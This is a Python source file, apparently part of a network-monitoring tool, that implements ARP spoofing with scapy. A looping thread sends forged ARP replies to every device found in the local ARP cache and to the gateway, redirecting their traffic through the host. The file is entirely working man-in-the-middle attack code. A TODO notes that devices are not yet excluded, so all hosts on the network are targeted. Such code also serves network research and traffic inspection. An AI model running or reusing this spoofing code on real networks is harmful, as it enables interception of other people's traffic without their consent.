"""
Based on ARP packets received, sends out spoofed ARP packets.

TODO: Do not spoof blacklisted devices.

"""
from host_state import HostState
import scapy.all as sc
import threading
import utils
import time


# Min seconds between successive spoofed packets
MIN_ARP_SPOOF_INTERVAL = 0.01


class ArpSpoof(object):

    def __init__(self, host_state):

        assert isinstance(host_state, HostState)
        self._host_state = host_state

        self._lock = threading.Lock()
        self._active = True
        self._thread = threading.Thread(target=self._arp_spoof_loop)
        self._thread.daemon = True

    def start(self):

        with self._lock:
            self._active = True

        utils.log('[Arp Spoof] Starting.')
        self._thread.start()

    def _arp_spoof_loop(self):

        while True:

            with self._lock:
                if not self._active:
                    return

            time.sleep(1)

            # Get ARP cache
            ip_mac_dict = self._host_state.get_ip_mac_dict_copy()
            gateway_ip = self._host_state.gateway_ip

            utils.log('[ARP Spoof] Cache:', str(ip_mac_dict))

            # Get gateway MAC addr
            try:
                gateway_mac = ip_mac_dict[gateway_ip]
            except KeyError:
                continue

            # Spoof individual devices on the network.
            # TODO: Do not spoof blacklisted devices.
            for (victim_ip, victim_mac) in ip_mac_dict.items():

                if victim_ip == gateway_ip:
                    continue

                utils.safe_run(
                    self._arp_spoof,
                    args=(victim_mac, victim_ip, gateway_mac, gateway_ip)
                )

                with self._lock:
                    if not self._active:
                        return

                time.sleep(max(MIN_ARP_SPOOF_INTERVAL, 2.0 / len(ip_mac_dict)))

    def _arp_spoof(self, victim_mac, victim_ip, gateway_mac, gateway_ip):
        """Sends out spoofed packets for a single target."""

        gateway_arp = sc.ARP()
        gateway_arp.op = 2
        gateway_arp.psrc = victim_ip
        gateway_arp.hwdst = gateway_mac
        gateway_arp.pdst = gateway_ip

        victim_arp = sc.ARP()
        victim_arp.op = 2
        victim_arp.psrc = gateway_ip
        victim_arp.hwdst = victim_mac
        victim_arp.pdst = victim_ip

        sc.send(victim_arp)
        sc.send(gateway_arp)

    def stop(self):

        utils.log('[Arp Spoof] Stopping.')

        with self._lock:
            self._active = False

        self._thread.join()

        utils.log('[Arp Spoof] Stopped.')



